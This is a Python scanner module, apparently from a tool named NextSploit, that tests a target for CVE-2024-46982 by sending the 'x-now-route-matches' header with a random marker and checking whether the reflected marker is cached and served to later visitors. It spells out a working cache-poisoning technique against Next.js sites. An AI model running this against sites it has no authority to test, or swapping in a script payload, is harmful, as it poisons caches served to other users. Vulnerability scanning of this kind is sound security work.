#!/usr/bin/env python3
"""
NextSploit — CVE-2024-46982: Cache Poisoning / Stored XSS via x-now-route-matches
"""

import requests
import uuid
from core.config import ScanConfig, CVE_DATABASE
from core.reporter import ModuleResult, Finding
from core.output import log_info, log_success, log_warning, log_debug, print_finding

CVE_ID = "CVE-2024-46982"
CVE_INFO = CVE_DATABASE.get(CVE_ID, {"title": "Cache Poisoning / Stored XSS", "severity": "HIGH"})

def scan(config: ScanConfig) -> ModuleResult:
    result = ModuleResult(
        cve=CVE_ID,
        title=CVE_INFO.get("title", "Cache Poisoning / Stored XSS"),
        severity=CVE_INFO.get("severity", "HIGH"),
        status="NOT VULNERABLE"
    )
    
    session = config.create_session()
    target = config.target.rstrip("/")
    
    log_info(f"Starting {CVE_ID} scan...")

    probe_marker = f"nextsploit-probe-{uuid.uuid4().hex[:8]}"
    
    try:
        # Phase 1: Test connection and potential SSR endpoint
        # We append a cache buster query param if it's the first hit to ensure fresh cache
        url = f"{target}?__nextDataReq=1&v={probe_marker[:4]}"
        headers = {
            "x-now-route-matches": "1",
            "User-Agent": probe_marker
        }
        
        log_debug(f"Sending poison payload to {url} with User-Agent: {probe_marker}")
        r1 = session.get(url, headers=headers, timeout=config.timeout)
        
        # Check if the response reflects our payload
        if probe_marker in r1.text:
            log_debug("Payload reflected in first response. Checking cache status...")
            
            # Check cache headers
            cache_control = r1.headers.get("Cache-Control", "").lower()
            
            if "s-maxage" in cache_control or "max-age" in cache_control:
                log_debug(f"Cache-Control header indicates caching: {cache_control}")
                
                # Phase 2: Confirm cache poisoning
                # Send request without the special headers to the exact same URL (so cache hit)
                normal_headers = {"User-Agent": "Mozilla/5.0"}
                r2 = session.get(url, headers=normal_headers, timeout=config.timeout)
                
                if probe_marker in r2.text:
                    detail = f"Target is vulnerable to cache poisoning via x-now-route-matches. Poisoned response was cached."
                    log_warning(detail)
                    
                    evidence = {
                        "endpoint": url,
                        "poison_headers": headers,
                        "cache_control": cache_control,
                        "reflected_payload": probe_marker
                    }
                    
                    print_finding(CVE_ID, detail, evidence)
                    
                    result.add_finding(Finding(
                        cve=CVE_ID,
                        severity=CVE_INFO.get("severity", "HIGH"),
                        title="Cache Poisoning / Stored XSS Confirmed",
                        status="VULNERABLE",
                        detail=detail,
                        evidence=evidence,
                        confidence=0.9
                    ))
                else:
                    log_debug("Payload reflected but not served from cache on subsequent request.")
            else:
                log_debug("Payload reflected but response does not appear to be cached (no max-age).")
        else:
            log_debug("Target does not reflect User-Agent payload via x-now-route-matches.")
            
    except requests.RequestException as e:
        result.error = str(e)
        
    if result.finding_count == 0:
        log_success("No Cache Poisoning vulnerability detected")

    return result
